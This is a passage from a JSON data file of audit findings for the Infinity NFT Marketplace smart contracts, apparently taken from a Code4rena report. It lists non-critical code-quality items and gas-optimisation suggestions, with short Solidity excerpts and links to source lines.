      "content": "\nSome functions are missing comments.\n\n### Proof of Concept\n\nInstances include:\n\n#### InfinityExchange.sol\n\n[function \\_emitMatchEvent](https://github.com/code-423n4/2022-06-infinity/blob/765376fa238bbccd8b1e2e12897c91098c7e5ac6/contracts/core/InfinityExchange.sol#L922)\\\n[function \\_emitTakerEvent](https://github.com/code-423n4/2022-06-infinity/blob/765376fa238bbccd8b1e2e12897c91098c7e5ac6/contracts/core/InfinityExchange.sol#L1005)\\\n[function \\_nftsHash](https://github.com/code-423n4/2022-06-infinity/blob/765376fa238bbccd8b1e2e12897c91098c7e5ac6/contracts/core/InfinityExchange.sol#L1185)\\\n[function \\_tokensHash](https://github.com/code-423n4/2022-06-infinity/blob/765376fa238bbccd8b1e2e12897c91098c7e5ac6/contracts/core/InfinityExchange.sol#L1201)\n\n#### InfinityStaker.sol\n\n[function \\_getDurationInSeconds](https://github.com/code-423n4/2022-06-infinity/blob/765376fa238bbccd8b1e2e12897c91098c7e5ac6/contracts/staking/InfinityStaker.sol#L275)\n\n#### InfinityToken.sol\n\n[function advanceEpoch()](https://github.com/code-423n4/2022-06-infinity/blob/765376fa238bbccd8b1e2e12897c91098c7e5ac6/contracts/token/InfinityToken.sol#L60)\\\n[function \\_beforeTokenTransfer()](https://github.com/code-423n4/2022-06-infinity/blob/765376fa238bbccd8b1e2e12897c91098c7e5ac6/contracts/token/InfinityToken.sol#L86)\\\n[function \\_afterTokenTransfer()](https://github.com/code-423n4/2022-06-infinity/blob/765376fa238bbccd8b1e2e12897c91098c7e5ac6/contracts/token/InfinityToken.sol#L95)\\\n[function \\_mint()](https://github.com/code-423n4/2022-06-infinity/blob/765376fa238bbccd8b1e2e12897c91098c7e5ac6/contracts/token/InfinityToken.sol#L103)\\\n[function \\_burn()](https://github.com/code-423n4/2022-06-infinity/blob/765376fa238bbccd8b1e2e12897c91098c7e5ac6/contracts/token/InfinityToken.sol#L107)\\\n[function getAdmin()](https://github.com/code-423n4/2022-06-infinity/blob/765376fa238bbccd8b1e2e12897c91098c7e5ac6/contracts/token/InfinityToken.sol#L113)\\\n[function getTimelock()](https://github.com/code-423n4/2022-06-infinity/blob/765376fa238bbccd8b1e2e12897c91098c7e5ac6/contracts/token/InfinityToken.sol#L117)\\\n[function getInflation()](https://github.com/code-423n4/2022-06-infinity/blob/765376fa238bbccd8b1e2e12897c91098c7e5ac6/contracts/token/InfinityToken.sol#L121)\\\n[function getCliff()](https://github.com/code-423n4/2022-06-infinity/blob/765376fa238bbccd8b1e2e12897c91098c7e5ac6/contracts/token/InfinityToken.sol#L125)\\\n[function getMaxEpochs()](https://github.com/code-423n4/2022-06-infinity/blob/765376fa238bbccd8b1e2e12897c91098c7e5ac6/contracts/token/InfinityToken.sol#L129)\\\n[function getEpochDuration()](https://github.com/code-423n4/2022-06-infinity/blob/765376fa238bbccd8b1e2e12897c91098c7e5ac6/contracts/token/InfinityToken.sol#L133)\n\n### Mitigation\n\nAdd comments to these functions\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Infinity NFT Marketplace",
      "source_link": "https://code4rena.com/reports/2022-06-infinity",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "24279",
      "title": "[N-04] Events indexing",
      "impact": "LOW",
      "content": "\nEvents should use indexed fields\n\n### Proof of Concept\n\nInstances include:\n\n#### InfinityExchange.sol\n\n[event CancelAllOrders(address user, uint256 newMinNonce)](https://github.com/code-423n4/2022-06-infinity/blob/765376fa238bbccd8b1e2e12897c91098c7e5ac6/contracts/core/InfinityExchange.sol#L80)\\\n[event CancelMultipleOrders(address user, uint256\\[\\] orderNonces)](https://github.com/code-423n4/2022-06-infinity/blob/765376fa238bbccd8b1e2e12897c91098c7e5ac6/contracts/core/InfinityExchange.sol#L81)\\\n[event NewWethTransferGasUnits(uint32 wethTransferGasUnits))](https://github.com/code-423n4/2022-06-infinity/blob/765376fa238bbccd8b1e2e12897c91098c7e5ac6/contracts/core/InfinityExchange.sol#L82)\\\n[event NewProtocolFee(uint16 protocolFee)](https://github.com/code-423n4/2022-06-infinity/blob/765376fa238bbccd8b1e2e12897c91098c7e5ac6/contracts/core/InfinityExchange.sol#L83)\\\n[event MatchOrderFulfilled(bytes32 sellOrderHash,bytes32 buyOrderHash,address seller,address buyer,address complication, // address of the complication that defines the execution ,address currency, // token address of the transacting currency,uint256 amount // amount spent on the order)](https://github.com/code-423n4/2022-06-infinity/blob/765376fa238bbccd8b1e2e12897c91098c7e5ac6/contracts/core/InfinityExchange.sol#L85-L92)\\\n[event TakeOrderFulfilled(bytes32 orderHash,address seller,address buyer,address complication, // address of the complication that defines the executionaddress currency, // token address of the transacting currencyuint256 amount // amount spent on the order)](https://github.com/code-423n4/2022-06-infinity/blob/765376fa238bbccd8b1e2e12897c91098c7e5ac6/contracts/core/InfinityExchange.sol#L95-L102)\n\n#### InfinityStaker.sol\n\n[ event Staked(address indexed user, uint256 amount, Duration duration)](https://github.com/code-423n4/2022-06-infinity/blob/765376fa238bbccd8b1e2e12897c91098c7e5ac6/contracts/staking/InfinityStaker.sol#L44)\\\n[event DurationChanged(address indexed user, uint256 amount, Duration oldDuration, Duration newDuration)](https://github.com/code-423n4/2022-06-infinity/blob/765376fa238bbccd8b1e2e12897c91098c7e5ac6/contracts/staking/InfinityStaker.sol#L45)\\\n[event UnStaked(address indexed user, uint256 amount)](https://github.com/code-423n4/2022-06-infinity/blob/765376fa238bbccd8b1e2e12897c91098c7e5ac6/contracts/staking/InfinityStaker.sol#L46)\\\n[event RageQuit(address indexed user, uint256 totalToUser, uint256 penalty)](https://github.com/code-423n4/2022-06-infinity/blob/765376fa238bbccd8b1e2e12897c91098c7e5ac6/contracts/staking/InfinityStaker.sol#L47)\n\n#### InfinityToken.sol\n\n[event EpochAdvanced(uint256 currentEpoch, uint256 supplyMinted)](https://github.com/code-423n4/2022-06-infinity/blob/765376fa238bbccd8b1e2e12897c91098c7e5ac6/contracts/token/InfinityToken.sol#L35)\n\n### Mitigation\n\nAdd indexed fields to these events so that they have the maximum number of indexed fields possible.\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Infinity NFT Marketplace",
      "source_link": "https://code4rena.com/reports/2022-06-infinity",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "24278",
      "title": "[N-03] Constants instead of magic numbers",
      "impact": "LOW",
      "content": "\nIt is best practice to use constant variables rather than literal values to make the code easier to understand and maintain.\n\n### Proof of Concept\n\nInstances include:\n\n#### InfinityExchange.sol\n\n[20000](https://github.com/code-423n4/2022-06-infinity/blob/765376fa238bbccd8b1e2e12897c91098c7e5ac6/contracts/core/InfinityExchange.sol#L202)\\\n[1000000](https://github.com/code-423n4/2022-06-infinity/blob/765376fa238bbccd8b1e2e12897c91098c7e5ac6/contracts/core/InfinityExchange.sol#L381)\\\n[10000](https://github.com/code-423n4/2022-06-infinity/blob/765376fa238bbccd8b1e2e12897c91098c7e5ac6/contracts/core/InfinityExchange.sol#L725)\\\n[10000](https://github.com/code-423n4/2022-06-infinity/blob/765376fa238bbccd8b1e2e12897c91098c7e5ac6/contracts/core/InfinityExchange.sol#L819)\\\n[10000](https://github.com/code-423n4/2022-06-infinity/blob/765376fa238bbccd8b1e2e12897c91098c7e5ac6/contracts/core/InfinityExchange.sol#L873)\\\n[10000](https://github.com/code-423n4/2022-06-infinity/blob/765376fa238bbccd8b1e2e12897c91098c7e5ac6/contracts/core/InfinityExchange.sol#L1135)\\\n[10\\*\\*4](https://github.com/code-423n4/2022-06-infinity/blob/765376fa238bbccd8b1e2e12897c91098c7e5ac6/contracts/core/InfinityExchange.sol#L1161)\n\n#### InfinityOrderBookComplication.sol\n\n[10\\*\\*4](https://github.com/code-423n4/2022-06-infinity/blob/765376fa238bbccd8b1e2e12897c91098c7e5ac6/contracts/core/InfinityOrderBookComplication.sol#L338)\n\n#### InfinityStaker.sol\n\n[10\\*\\*18](https://github.com/code-423n4/2022-06-infinity/blob/765376fa238bbccd8b1e2e12897c91098c7e5ac6/contracts/staking/InfinityStaker.sol#L237)\n\n### Mitigation\n\nDefine constant variables for the literal values aforementioned.\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Infinity NFT Marketplace",
      "source_link": "https://code4rena.com/reports/2022-06-infinity",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "24277",
      "title": "[N-02] Commented code",
      "impact": "LOW",
      "content": "\nThere are portions of commented code in some files.\n\n### Proof of Concept\n\nInstances include:\n\n#### InfinityExchange.sol\n\n[line 1169](https://github.com/code-423n4/2022-06-infinity/blob/765376fa238bbccd8b1e2e12897c91098c7e5ac6/contracts/core/InfinityExchange.sol#L1169)\\\n[line1186](https://github.com/code-423n4/2022-06-infinity/blob/765376fa238bbccd8b1e2e12897c91098c7e5ac6/contracts/core/InfinityExchange.sol#L1186)\\\n[line1202](https://github.com/code-423n4/2022-06-infinity/blob/765376fa238bbccd8b1e2e12897c91098c7e5ac6/contracts/core/InfinityExchange.sol#L1202)\n\n### Mitigation\n\nRemove commented code\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Infinity NFT Marketplace",
      "source_link": "https://code4rena.com/reports/2022-06-infinity",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "24276",
      "title": "[N-01] Comment Missing function parameter",
      "impact": "LOW",
      "content": "\nSome of the function comments are missing function parameters or returns\n\n### Proof Of Concept\n\nInstances include:\n\n#### InfinityExchange.sol\n\n[bool verifySellOrder](https://github.com/code-423n4/2022-06-infinity/blob/765376fa238bbccd8b1e2e12897c91098c7e5ac6/contracts/core/InfinityExchange.sol#L462)\\\n[uint256 execPrice](https://github.com/code-423n4/2022-06-infinity/blob/765376fa238bbccd8b1e2e12897c91098c7e5ac6/contracts/core/InfinityExchange.sol#L677)\\\n[address seller,address buyer,OrderTypes.OrderItem\\[\\] calldata constructedNfts,address currency,uint256 amount](https://github.com/code-423n4/2022-06-infinity/blob/765376fa238bbccd8b1e2e12897c91098c7e5ac6/contracts/core/InfinityExchange.sol#L835-L840)\\\n[address seller,address buyer,uint256 sellNonce,uint256 buyNonce,OrderTypes.OrderItem\\[\\] calldata constructedNfts,address currency,uint256 amount](https://github.com/code-423n4/2022-06-infinity/blob/765376fa238bbccd8b1e2e12897c91098c7e5ac6/contracts/core/InfinityExchange.sol#L905-L912)\\\n[OrderTypes.MakerOrder calldata order](https://github.com/code-423n4/2022-06-infinity/blob/765376fa238bbccd8b1e2e12897c91098c7e5ac6/contracts/core/InfinityExchange.sol#L1153)\\\n[OrderTypes.MakerOrder calldata order](https://github.com/code-423n4/2022-06-infinity/blob/765376fa238bbccd8b1e2e12897c91098c7e5ac6/contracts/core/InfinityExchange.sol#L1168)\\\n[address destination,address currency,uint256 amount](https://github.com/code-423n4/2022-06-infinity/blob/765376fa238bbccd8b1e2e12897c91098c7e5ac6/contracts/core/InfinityExchange.sol#L1220-L1223)\\\n[address destination](https://github.com/code-423n4/2022-06-infinity/blob/765376fa238bbccd8b1e2e12897c91098c7e5ac6/contracts/core/InfinityExchange.sol#L1229)\n\n#### InfinityOrderBookComplication.sol\n\n[OrderTypes.MakerOrder calldata sell, OrderTypes.MakerOrder calldata buy](https://github.com/code-423n4/2022-06-infinity/blob/765376fa238bbccd8b1e2e12897c91098c7e5ac6/contracts/core/InfinityOrderBookComplication.sol#L169)\\\n[OrderTypes.MakerOrder calldata sell, OrderTypes.MakerOrder calldata buy](https://github.com/code-423n4/2022-06-infinity/blob/765376fa238bbccd8b1e2e12897c91098c7e5ac6/contracts/core/InfinityOrderBookComplication.sol#L182)\\\n[OrderTypes.MakerOrder calldata sell,OrderTypes.MakerOrder calldata buy,OrderTypes.OrderItem\\[\\] calldata constructedNfts](https://github.com/code-423n4/2022-06-infinity/blob/765376fa238bbccd8b1e2e12897c91098c7e5ac6/contracts/core/InfinityOrderBookComplication.sol#L182-L195)\\\n[OrderTypes.MakerOrder calldata makerOrder, OrderTypes.OrderItem\\[\\] calldata takerItems](https://github.com/code-423n4/2022-06-infinity/blob/765376fa238bbccd8b1e2e12897c91098c7e5ac6/contracts/core/InfinityOrderBookComplication.sol#L209)\\\n[OrderTypes.MakerOrder\\[\\] calldata orders](https://github.com/code-423n4/2022-06-infinity/blob/765376fa238bbccd8b1e2e12897c91098c7e5ac6/contracts/core/InfinityOrderBookComplication.sol#L317)\\\n[OrderTypes.MakerOrder calldata order](https://github.com/code-423n4/2022-06-infinity/blob/765376fa238bbccd8b1e2e12897c91098c7e5ac6/contracts/core/InfinityOrderBookComplication.sol#L330)\n\n#### InfinityStaker.sol\n\n[address user,uint256 amount,uint256 noVesting,uint256 vestedThreeMonths,uint256 vestedSixMonths,uint256 vestedTwelveMonths](https://github.com/code-423n4/2022-06-infinity/blob/765376fa238bbccd8b1e2e12897c91098c7e5ac6/contracts/staking/InfinityStaker.sol#L291-L296)\\\n[address user](https://github.com/code-423n4/2022-06-infinity/blob/765376fa238bbccd8b1e2e12897c91098c7e5ac6/contracts/staking/InfinityStaker.sol#L328)\\\n[address destination](https://github.com/code-423n4/2022-06-infinity/blob/765376fa238bbccd8b1e2e12897c91098c7e5ac6/contracts/staking/InfinityStaker.sol#L345)\\\n[StakeLevel stakeLevel, uint16 threshold](https://github.com/code-423n4/2022-06-infinity/blob/765376fa238bbccd8b1e2e12897c91098c7e5ac6/contracts/staking/InfinityStaker.sol#L351)\\\n[uint16 threeMonthPenalty,uint16 sixMonthPenalty,uint16 twelveMonthPenalty](https://github.com/code-423n4/2022-06-infinity/blob/765376fa238bbccd8b1e2e12897c91098c7e5ac6/contracts/staking/InfinityStaker.sol#L365-L367)\\\n[address \\_infinityTreasury](https://github.com/code-423n4/2022-06-infinity/blob/765376fa238bbccd8b1e2e12897c91098c7e5ac6/contracts/staking/InfinityStaker.sol#L375)\n\n### Mitigation\n\nAdd a comment for these parameters\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Infinity NFT Marketplace",
      "source_link": "https://code4rena.com/reports/2022-06-infinity",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "5533",
      "title": "[G-15] Using `private` rather than `public` for constants, saves gas",
      "impact": "GAS",
      "content": "\nIf needed, the value can be read from the verified contract source code. Saves **3406-3606 gas** in deployment gas due to the compiler not having to create non-payable getter functions for deployment calldata, not having to store the bytes of the value outside of where it's used, and not adding another entry to the method ID table\n\n*There are 5 instances of this issue.*\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Infinity NFT Marketplace",
      "source_link": "https://code4rena.com/reports/2022-06-infinity",
      "github_link": "#g-15-using-private-rather-than-public-for-constants-saves-gas",
      "tags": [],
      "finders": []
    },
    {
      "id": "5532",
      "title": "[G-11] `>=` costs less gas than `>`",
      "impact": "GAS",
      "content": "\nThe compiler uses opcodes `GT` and `ISZERO` for solidity code that uses `>`, but only requires `LT` for `>=`, [which saves **3 gas**](https://gist.github.com/IllIllI000/3dc79d25acccfa16dee4e83ffdc6ffde)\n\n*There is 1 instance of this issue:*\n\n```solidity\nFile: contracts/token/InfinityToken.sol   #1\n\n67        epochsPassedSinceLastAdvance = epochsPassedSinceLastAdvance > epochsLeft\n68          ? epochsLeft\n69:         : epochsPassedSinceLastAdvance;\n```\n\n<https://github.com/code-423n4/2022-06-infinity/blob/765376fa238bbccd8b1e2e12897c91098c7e5ac6/contracts/token/InfinityToken.sol#L67-L69>\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Infinity NFT Marketplace",
      "source_link": "https://code4rena.com/reports/2022-06-infinity",
      "github_link": "#g-11--costs-less-gas-than-",
      "tags": [],
      "finders": []
    },
    {
      "id": "5531",
      "title": "[G-10] Using `> 0` costs more gas than `!= 0` when used on a `uint` in a `require()` statement",
      "impact": "GAS",
      "content": "\nThis change saves **[6 gas](https://aws1.discourse-cdn.com/business6/uploads/zeppelin/original/2X/3/363a367d6d68851f27d2679d10706cd16d788b96.png)** per instance. The optimization works until solidity version [0.8.13](https://gist.github.com/IllIllI000/bf2c3120f24a69e489f12b3213c06c94) where there is a regression in gas costs.\n\n*There is 1 instance of this issue:*\n\n```solidity\nFile: contracts/core/InfinityExchange.sol   #1\n\n392:      require(numNonces > 0, 'cannot be empty');\n```\n\n<https://github.com/code-423n4/2022-06-infinity/blob/765376fa238bbccd8b1e2e12897c91098c7e5ac6/contracts/core/InfinityExchange.sol#L392>\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Infinity NFT Marketplace",
      "source_link": "https://code4rena.com/reports/2022-06-infinity",
      "github_link": "#g-10-using--0-costs-more-gas-than--0-when-used-on-a-uint-in-a-require-statement",
      "tags": [],
      "finders": []
    },
    {
      "id": "5530",
      "title": "[G-09] Using `bool`s for storage incurs overhead",
      "impact": "GAS",
      "content": "\n```solidity\n    // Booleans are more expensive than uint256 or any type that takes up a full\n    // word because each write operation emits an extra SLOAD to first read the\n    // slot's contents, replace the bits taken up by the boolean, and then write\n    // back. This is the compiler's defense against contract upgrades and\n    // pointer aliasing, and it cannot be disabled.\n```\n\n<https://github.com/OpenZeppelin/openzeppelin-contracts/blob/58f635312aa21f947cae5f8578638a85aa2519f5/contracts/security/ReentrancyGuard.sol#L23-L27><br>\nUse `uint256(1)` and `uint256(2)` for true/false to avoid a Gwarmaccess (**[100 gas](https://gist.github.com/IllIllI000/1b70014db712f8572a72378321250058)**) for the extra SLOAD, and to avoid Gsset (**20000 gas**) when changing from 'false' to 'true', after having been 'true' in the past\n\n*There is 1 instance of this issue:*\n\n```solidity\nFile: contracts/core/InfinityExchange.sol   #1\n\n73:     mapping(address => mapping(uint256 => bool)) public isUserOrderNonceExecutedOrCancelled;\n```\n\n<https://github.com/code-423n4/2022-06-infinity/blob/765376fa238bbccd8b1e2e12897c91098c7e5ac6/contracts/core/InfinityExchange.sol#L73>\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Infinity NFT Marketplace",
      "source_link": "https://code4rena.com/reports/2022-06-infinity",
      "github_link": "#g-09-using-bools-for-storage-incurs-overhead",
      "tags": [],
      "finders": []
    },
    {
      "id": "5529",
      "title": "[G-08] `require()`/`revert()` strings longer than 32 bytes cost extra gas",
      "impact": "GAS",
      "content": "\nEach extra memory word of bytes past the original 32 [incurs an MSTORE](https://gist.github.com/hrkrshnn/ee8fabd532058307229d65dcd5836ddc#consider-having-short-revert-strings) which costs **3 gas**\n\n*There are 3 instances of this issue.*\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Infinity NFT Marketplace",
      "source_link": "https://code4rena.com/reports/2022-06-infinity",
      "github_link": "#g-08-requirerevert-strings-longer-than-32-bytes-cost-extra-gas",
      "tags": [],
      "finders": []
    },
    {
      "id": "5528",
      "title": "[G-06] `internal` functions only called once can be inlined to save gas",
      "impact": "GAS",
      "content": "\nNot inlining costs **20 to 40 gas** because of two extra `JUMP` instructions and additional stack operations needed for function calls.\n\n*There are 22 instances of this issue.*\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Infinity NFT Marketplace",
      "source_link": "https://code4rena.com/reports/2022-06-infinity",
      "github_link": "#g-06-internal-functions-only-called-once-can-be-inlined-to-save-gas",
      "tags": [],
      "finders": []
    },
    {
      "id": "4963",
      "title": "[G-19] Functions guaranteed to revert when called by normal users can be marked `payable`",
      "impact": "GAS",
      "content": "\nIf a function modifier such as `onlyOwner` is used, the function will revert if a normal user tries to pay the function. Marking the function as `payable` will lower the gas cost for legitimate callers because the compiler will not include checks for whether a payment was provided. The extra opcodes avoided are\n`CALLVALUE`(2),`DUP1`(3),`ISZERO`(3),`PUSH2`(3),`JUMPI`(10),`PUSH1`(3),`DUP1`(3),`REVERT`(0),`JUMPDEST`(1),`POP`(2), which costs an average of about **21 gas per call** to the function, in addition to the extra deployment cost\n\n*There are 13 instances of this issue.*\n\n**[nneverlander (Infinity) commented](https://github.com/code-423n4/2022-06-infinity-findings/issues/186#issuecomment-1163502067):**\n > Thank you for the detailed report.\n\n**[HardlyDifficult (judge) commented](https://github.com/code-423n4/2022-06-infinity-findings/issues/186#issuecomment-1184785713):**\n > ðŸ”¥ \n\n***\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Infinity NFT Marketplace",
      "source_link": "https://code4rena.com/reports/2022-06-infinity",
      "github_link": "#g-19-functions-guaranteed-to-revert-when-called-by-normal-users-can-be-marked-payable",
      "tags": [],
      "finders": []
    },
    {
      "id": "4962",
      "title": "[G-18] Use custom errors rather than `revert()`/`require()` strings to save gas",
      "impact": "GAS",
      "content": "\nCustom errors are available from solidity version 0.8.4. Custom errors save [**\\~50 gas**](https://gist.github.com/IllIllI000/ad1bd0d29a0101b25e57c293b4b0c746) each time they're hitby [avoiding having to allocate and store the revert string](https://blog.soliditylang.org/2021/04/21/custom-errors/#errors-in-depth). Not defining the strings also save deployment gas\n\n*There are 47 instances of this issue.*\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Infinity NFT Marketplace",
      "source_link": "https://code4rena.com/reports/2022-06-infinity",
      "github_link": "#g-18-use-custom-errors-rather-than-revertrequire-strings-to-save-gas",
      "tags": [],
      "finders": []
    },
    {
      "id": "4961",
      "title": "[G-17] Empty blocks should be removed or emit something",
      "impact": "GAS",
      "content": "\nThe code should be refactored such that they no longer exist, or the block should do something useful, such as emitting an event or reverting. If the contract is meant to be extended, the contract should be `abstract` and the function signatures be added without any default implementation. If the block is an empty `if`-statement block to avoid doing subsequent checks in the else-if/else conditions, the else-if/else conditions should be nested under the negation of the if-statement, because they involve different classes of checks, which may lead to the introduction of errors when the code is later modified (`if(x){}else if(y){...}else{...}` => `if(!x){if(y){...}else{...}}`)\n\n*There are 4 instances of this issue.*\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Infinity NFT Marketplace",
      "source_link": "https://code4rena.com/reports/2022-06-infinity",
      "github_link": "#g-17-empty-blocks-should-be-removed-or-emit-something",
      "tags": [],
      "finders": []
    },
    {
      "id": "4960",
      "title": "[G-16] Duplicated `require()`/`revert()` checks should be refactored to a modifier or function",
      "impact": "GAS",
      "content": "\nSaves deployment costs\n\n*There are 6 instances of this issue.*\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Infinity NFT Marketplace",
      "source_link": "https://code4rena.com/reports/2022-06-infinity",
      "github_link": "#g-16-duplicated-requirerevert-checks-should-be-refactored-to-a-modifier-or-function",
      "tags": [],
      "finders": []
    },
    {
      "id": "4958",
      "title": "[G-14] Usage of `uints`/`ints` smaller than 32 bytes (256 bits) incurs overhead",
      "impact": "GAS",
      "content": "\n> When using elements that are smaller than 32 bytes, your contractâ€™s gas usage may be higher. This is because the EVM operates on 32 bytes at a time. Therefore, if the element is smaller than that, the EVM must use more operations in order to reduce the size of the element from 32 bytes to the desired size.\n\n<https://docs.soliditylang.org/en/v0.8.11/internals/layout_in_storage.html>\nUse a larger size then downcast where needed\n\n*There are 39 instances of this issue.*\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Infinity NFT Marketplace",
      "source_link": "https://code4rena.com/reports/2022-06-infinity",
      "github_link": "#g-14-usage-of-uintsints-smaller-than-32-bytes-256-bits-incurs-overhead",
      "tags": [],
      "finders": []
    },
    {
      "id": "4957",
      "title": "[G-13] Splitting `require()` statements that use `&&` saves gas",
      "impact": "GAS",
      "content": "\nSee [this issue](https://github.com/code-423n4/2022-01-xdefi-findings/issues/128) which describes the fact that there is a larger deployment gas cost, but with enough runtime calls, the change ends up being cheaper\n\n*There are 2 instances of this issue.*\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Infinity NFT Marketplace",
      "source_link": "https://code4rena.com/reports/2022-06-infinity",
      "github_link": "#g-13-splitting-require-statements-that-use--saves-gas",
      "tags": [],
      "finders": []
    },
    {
      "id": "4956",
      "title": "[G-12] It costs more gas to initialize non-`constant`/non-`immutable` variables to zero than to let the default of zero be applied",
      "impact": "GAS",
      "content": "\nNot overwriting the default for [stack variables](https://gist.github.com/IllIllI000/e075d189c1b23dce256cd166e28f3397) saves **8 gas**. Storage and memory variables have larger savings\n\n*There are 26 instances of this issue.*\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Infinity NFT Marketplace",
      "source_link": "https://code4rena.com/reports/2022-06-infinity",
      "github_link": "#g-12-it-costs-more-gas-to-initialize-non-constantnon-immutable-variables-to-zero-than-to-let-the-default-of-zero-be-applied",
      "tags": [],
      "finders": []
    },
    {
      "id": "4951",
      "title": "[G-07] Add `unchecked {}` for subtractions where the operands cannot underflow because of a previous `require()` or `if`-statement",
      "impact": "GAS",
      "content": "\n`require(a <= b); x = b - a` => `require(a <= b); unchecked { x = b - a }`\n\n*There are 3 instances of this issue.*\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Infinity NFT Marketplace",
      "source_link": "https://code4rena.com/reports/2022-06-infinity",
      "github_link": "#g-07-add-unchecked--for-subtractions-where-the-operands-cannot-underflow-because-of-a-previous-require-or-if-statement",
      "tags": [],
      "finders": []
    },
    {
      "id": "4949",
      "title": "[G-05] Multiple accesses of a mapping/array should use a local variable cache",
      "impact": "GAS",
      "content": "\nThe instances below point to the second+ access of a value inside a mapping/array, within a function. Caching a mapping's value in a local `storage` or `calldata` variable when the value is accessed [multiple times](https://gist.github.com/IllIllI000/ec23a57daa30a8f8ca8b9681c8ccefb0), saves **\\~42 gas per access** due to not having to recalculate the key's keccak256 hash (Gkeccak256 - **30 gas**) and that calculation's associated stack operations. Caching an array's struct avoids recalculating the array offsets into memory/calldata\n\n*There are 13 instances of this issue.*\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Infinity NFT Marketplace",
      "source_link": "https://code4rena.com/reports/2022-06-infinity",
      "github_link": "#g-05-multiple-accesses-of-a-mappingarray-should-use-a-local-variable-cache",
      "tags": [],
      "finders": []
    },
    {
      "id": "4948",
      "title": "[G-04] State variables should be cached in stack variables rather than re-reading them from storage",
      "impact": "GAS",
      "content": "\nThe instances below point to the second+ access of a state variable within a function. Caching of a state variable replace each Gwarmaccess (**100 gas**) with a much cheaper stack read. Other less obvious fixes/optimizations include having local memory caches of state variable structs, or having local caches of state variable contracts/addresses.\n\n*There are 9 instances of this issue.*\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Infinity NFT Marketplace",
      "source_link": "https://code4rena.com/reports/2022-06-infinity",
      "github_link": "#g-04-state-variables-should-be-cached-in-stack-variables-rather-than-re-reading-them-from-storage",
      "tags": [],
      "finders": []
    },
    {
      "id": "4947",
      "title": "[G-03] State variables can be packed into fewer storage slots",
      "impact": "GAS",
      "content": "\nIf variables occupying the same slot are both written the same function or by the constructor, avoids a separate Gsset (**20000 gas**). Reads of the variables can also be cheaper\n\n*There is 1 instance of this issue:*\n\n```solidity\nFile: contracts/staking/InfinityStaker.sol   #1\n\n/// @audit Variable ordering with 3 slots instead of the current 4:\n/// @audit  mapping(32):userstakedAmounts, address(20):INFINITY_TOKEN, uint16(2):BRONZE_STAKE_THRESHOLD, uint16(2):SILVER_STAKE_THRESHOLD, uint16(2):GOLD_STAKE_THRESHOLD, uint16(2):PLATINUM_STAKE_THRESHOLD, uint16(2):THREE_MONTH_PENALTY, uint16(2):SIX_MONTH_PENALTY, address(20):INFINITY_TREASURY, uint16(2):TWELVE_MONTH_PENALTY\n23:     mapping(address => mapping(Duration => StakeAmount)) public userstakedAmounts;\n```\n\n<https://github.com/code-423n4/2022-06-infinity/blob/765376fa238bbccd8b1e2e12897c91098c7e5ac6/contracts/staking/InfinityStaker.sol#L23>\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Infinity NFT Marketplace",
      "source_link": "https://code4rena.com/reports/2022-06-infinity",
      "github_link": "#g-03-state-variables-can-be-packed-into-fewer-storage-slots",
      "tags": [],
      "finders": []
    },
    {
      "id": "4946",
      "title": "[G-02] State variables only set in the constructor should be declared `immutable`",
      "impact": "GAS",
